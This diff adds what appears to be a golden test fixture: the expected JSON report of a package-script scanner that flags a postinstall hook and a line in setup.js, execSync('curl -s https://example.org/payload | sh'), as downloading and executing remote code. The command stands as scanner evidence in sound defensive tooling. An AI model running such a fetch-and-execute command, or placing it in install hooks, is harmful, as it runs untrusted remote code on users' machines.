@@ -1,0 +1,44 @@
+exit 1
+{
+  "id": "<uuid>",
+  "created": 0,
+  "kind": "Package script inventory",
+  "subject": "<inputs>/project",
+  "sha256": "4b07b1440bc83d8e624799c664f944e9e2bbd95a681c2e6577f94d2104e860fc",
+  "findings": [
+    {
+      "rule": "package.lifecycle",
+      "severity": "review",
+      "summary": "golden-fixture@1.0.0: postinstall",
+      "evidence": "<inputs>/project/package.json\nnode scripts/setup.js",
+      "action": "Review referenced source. Installation approvals do not constrain later runtime behavior."
+    },
+    {
+      "rule": "package.script",
+      "severity": "info",
+      "summary": "golden-fixture@1.0.0: test",
+      "evidence": "<inputs>/project/package.json\necho ok",
+      "action": "Review referenced source. Installation approvals do not constrain later runtime behavior."
+    },
+    {
+      "rule": "shell.download",
+      "severity": "review",
+      "summary": "Downloads remote content",
+      "evidence": "<inputs>/project/scripts/setup.js: Line 3: execSync('curl -s https://example.org/payload | sh');",
+      "action": "Inspect each payload and verify its origin before execution."
+    },
+    {
+      "rule": "shell.execute-download",
+      "severity": "high",
+      "summary": "Downloads and executes code",
+      "evidence": "<inputs>/project/scripts/setup.js: Line 3: execSync('curl -s https://example.org/payload | sh');",
+      "action": "Save and inspect the exact downloaded bytes first."
+    }
+  ],
+  "coverage": [
+    "Reads package manifests and script source as data; never invokes npm, build backends, or lifecycle hooks. Unknown/generated commands remain unresolved.",
+    "1 manifests read. Dependencies absent from disk are not fully inspected."
+  ],
+  "errors": [],
+  "details": ""
+}
